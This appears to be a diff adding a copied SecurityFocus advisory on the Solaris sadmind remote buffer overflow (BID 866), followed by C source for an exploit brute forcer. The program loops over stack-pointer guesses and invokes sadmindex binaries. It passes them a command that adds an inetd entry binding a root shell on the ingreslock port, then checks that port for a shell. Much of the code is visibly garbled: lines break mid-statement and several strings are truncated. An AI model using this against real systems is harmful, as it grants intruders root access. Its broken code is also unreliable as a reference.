@@ -1,0 +1,254 @@
+source: http://www.securityfocus.com/bid/866/info
+  
+Certain versions of Solaris ship with a version of sadmind which is vulnerable to a remotely exploitable buffer overflow attack. sadmind is the daemon used by Solstice AdminSuite applications to perform distributed system administration operations such as adding users. The sadmind daemon is started automatically by the inetd daemon whenever a request to invoke an operation is received.
+  
+Under vulnerable versions of sadmind (2.6 and 7.0 have been tested), if a long buffer is passed to a NETMGT_PROC_SERVICE request (called via clnt_call()), it is possible to overwrite the stack pointer and execute arbitrary code. The actual buffer in questions appears to hold the client's domain name. The overflow in sadmind takes place in the get_auth() function, part of the /usr/snadm/lib/libmagt.so.2 library. Because sadmind runs as root any code launched as a result will run as with root privileges, therefore resulting in a root compromise. 
+
+// *** Synnergy Networks
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <string.h>
+#include <sys/errno.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <unistd.h>
+
+/* *** ATTENTION *** you may have to change some
+of these *** ATTENTION *** */
+#define EXPX86          "sadmindex-x86"  /*
+sadmind exploit for x86 arch */
+#define EXPSPARC        "sadmindex-sparc"  /*
+sadmind exploit for sparc arch */
+#define INC             4  /* sp brute forcing
+incrementation - 4 should be ok
+
+/* DON'T change the following */
+#define FALSE           0  /* false */
+#define TRUE            !FALSE  /* true */
+#define BINDINGRES      "echo 'ingreslock stream
+tcp nowait root /bin/sh sh -i'
+                                        > /tmp/.x;
+/usr/sbin/inetd -s /tmp/.x;
+                                        m -f
+/tmp/.x;"  /* bind rootshell */
+#define SPX8626         0x080418ec  /* default
+sadmindex sp for x86 2.6 */
+#define SPX867          0x08041798  /* default
+sadmindex sp for x86 7.0 */
+#define SPSPARC26       0xefff9580  /* default
+sadmindex sp for sparc 2.6 */
+#define SPSPARC7        0xefff9418  /* default
+sadmindex sp for sparc 7.0 */
+#define EXPCMDX8626     "./%s -h %s -c \"%s\" -s
+0x%x -j 512\n"  /* cmd line */
+#define EXPCMDX867      "./%s -h %s -c \"%s\" -s
+0x%x -j 536\n"  /* cmd line */
+#define EXPCMDSPARC     "./%s -h %s -c \"%s\" -s
+0x%x\n"  /* cmd line */
+
+int
+main(int argc, char **argv)
+{
+        int i, sockfd, fd, size = 4096, sign = -1;
+        long int addr;
+        char *buffer = (char *) malloc (size);
+        struct hostent *he;
+        struct sockaddr_in their_addr;
+        if (argc < 3)
+        {
+                fprintf(stderr, "\nsadmindex sp
+brute forcer - by elux\n");
+                fprintf(stderr, "usage: %s [arch]
+<host>\n\n", argv[0]);
+                fprintf(stderr, "\tarch:\n");
+                fprintf(stderr, "\t1 - x86 Solaris
+2.6\n");
+                fprintf(stderr, "\t2 - x86 Solaris
+7.0\n");
+                fprintf(stderr, "\t3 - SPARC
+Solaris 2.6\n");
+                fprintf(stderr, "\t4 - SPARC
+Solaris 7.0\n\n");
+                exit(TRUE);
+        }
+
+        if ( (he = gethostbyname(argv[2])) ==
+NULL)
+        {
+                printf("Unable to resolve %s\n",
+argv[2]);
+                exit(TRUE);
+        }
+
+        their_addr.sin_family = AF_INET;
+        their_addr.sin_port = htons(1524);
+        their_addr.sin_addr = *((struct in_addr
+*)he->h_addr);
+        bzero(&(their_addr.sin_zero), 8);
+
+     if ( (strcmp(argv[1], "1")) == 0)
+        {
+                addr = SPX8626;
+                printf("\nAlright... sit back and
+relax while this program brut
+                for (i = 0; i <= 4096; i += INC)
+                {
+                        if ( (sockfd =
+socket(AF_INET, SOCK_STREAM, 0)) != -1)
+                        {
+                                if (
+(connect(sockfd, (struct sockaddr *)&their
+                                {
+                                       
+fprintf(stderr, "\n\nNow telnet to %s,
+                                       
+close(sockfd);
+                                       
+exit(FALSE);
+                                }
+                        }
+                        if ( (fd = open(EXPX86,
+O_RDONLY)) != -1)
+                        {
+                                sign *= -1;
+                                addr -= i *sign;
+                                snprintf(buffer,
+size, EXPCMDX8626, EXPX86, arg
+                                system(buffer);
+                        }
+                        else
+                   {
+                                printf("\n\n%s
+doesn't exisit, you need the sad
+                                exit(TRUE);
+                        }
+                }
+        }
+        else if ( (strcmp(argv[1], "2")) == 0)
+        {
+                addr = SPX867;
+                printf("\nAlright... sit back and
+relax while this program brut
+                for (i = 0; i <= 4096; i += INC)
+                {
+                        if ( (sockfd =
+socket(AF_INET, SOCK_STREAM, 0)) != -1)
+                        {
+                                if (
+(connect(sockfd, (struct sockaddr *)&their
+                                {
+                                       
+fprintf(stderr, "\n\nNow telnet to %s,
+                                       
+close(sockfd);
+                                       
+exit(FALSE);
+                                }
+                        }
+                        if ( (fd = open(EXPX86,
+O_RDONLY)) != -1)
+                        {
+
+
+                             sign *= -1;
+                                addr -= i *sign;
+                                snprintf(buffer,
+size, EXPCMDX867, EXPX86, argv
+                                system(buffer);
+                        }
+                        else
+                        {
+                                printf("\n\n%s
+doesn't exisit, you need the sad
+                                exit(TRUE);
+                        }
+                }
+        }
+        else if ( (strcmp(argv[1], "3")) == 0)
+        {
+                addr = SPSPARC26;
+                printf("\nAlright... sit back and
+relax while this program brut
+                for (i = 0; i <= 4096; i += INC)
+                {
+                        if ( (sockfd =
+socket(AF_INET, SOCK_STREAM, 0)) != -1)
+                        {
+                                if (
+(connect(sockfd, (struct sockaddr *)&their
+                                {
+                                       
+fprintf(stderr, "\n\nNow telnet to %s,
+                          close(sockfd);
+                                       
+exit(FALSE);
+                                }
+                        }
+                        if ( (fd = open(EXPSPARC,
+O_RDONLY)) != -1)
+                        {
+                                sign *= -1;
+                                addr -= i *sign;
+                                snprintf(buffer,
+size, EXPCMDSPARC, EXPSPARC, a
+                                system(buffer);
+                        }
+                        else
+                        {
+                                printf("\n\n%s
+doesn't exisit, you need the sad
+                                exit(TRUE);
+                        }
+                }
+        }
+        else if ( (strcmp(argv[1], "4")) == 0)
+        {
+                addr = SPSPARC7;   
+                printf("\nAlright... sit back and
+relax while this program brut
+                for (i = 0; i <= 4096; i += INC)
+     {
+                        if ( (sockfd =
+socket(AF_INET, SOCK_STREAM, 0)) != -1)
+                        {
+                                if (
+(connect(sockfd, (struct sockaddr *)&their
+                                {  
+                                       
+fprintf(stderr, "\n\nNow telnet to %s,
+                                       
+close(sockfd);
+                                       
+exit(FALSE);
+                                }  
+                        }
+                        if ( (fd = open(EXPSPARC,
+O_RDONLY)) != -1)
+                        {
+                                sign *= -1;
+                                addr -= i *sign;
+                                snprintf(buffer,
+size, EXPCMDSPARC, EXPSPARC, a
+                                system(buffer);
+                        }
+                        else
+                        {
+                                printf("\n\n%s
+doesn't exisit, you need the sad
+                                exit(TRUE);
+                        }
+                }
+
+        }
+        else
+                printf("%s is not a supported
+arch, try 1 - 4 ... .. .\n", argv
+}
+
+// EOF
